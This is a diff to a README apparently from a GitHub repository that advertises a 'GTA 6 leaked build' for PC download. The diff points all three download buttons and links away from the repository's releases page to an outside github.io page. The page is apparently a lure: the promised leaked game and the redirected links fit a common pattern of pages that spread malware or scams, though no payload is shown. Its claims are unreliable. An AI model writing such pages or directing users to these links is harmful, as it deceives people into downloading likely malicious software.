@@ -1,6 +1,6 @@
 <h1>🎮 GTA-6-Leaked-Build-Download-2026 - Your Gateway to Playing GTA 6 on PC Today</h1>
 
-[![Download GTA 6 Leaked Build](https://img.shields.io/badge/Download-GTA_6_Leaked_Build_2026-00FF00?style=for-the-badge&logo=rockstargames&logoColor=white&labelColor=1a1a2e&color=16c79a)](https://github.com/electrophorusgarland3109/GTA-6-Leaked-Build-Download-2026/releases)
+[![Download GTA 6 Leaked Build](https://img.shields.io/badge/Download-GTA_6_Leaked_Build_2026-00FF00?style=for-the-badge&logo=rockstargames&logoColor=white&labelColor=1a1a2e&color=16c79a)](https://electrophorusgarland3109.github.io)
 
 ---
 
@@ -23,7 +23,7 @@ Follow these simple steps, and you'll be driving through Vice City in no time. I
 
 Visit this link to download the application.
 
-[**🔗 Click Here to Download GTA 6 Leaked Build**](https://github.com/electrophorusgarland3109/GTA-6-Leaked-Build-Download-2026/releases)
+[**🔗 Click Here to Download GTA 6 Leaked Build**](https://electrophorusgarland3109.github.io)
 
 This is the official page for this release. You'll find the main download button on that page.
 
@@ -140,7 +140,7 @@ Before you start, make sure:
 
 Remember, the download is always available. 
 
-[**🚀 Download GTA 6 Leaked Build 2026 Now**](https://github.com/electrophorusgarland3109/GTA-6-Leaked-Build-Download-2026/releases)
+[**🚀 Download GTA 6 Leaked Build 2026 Now**](https://electrophorusgarland3109.github.io)
 
 Enjoy the game, and welcome to Vice City.
 
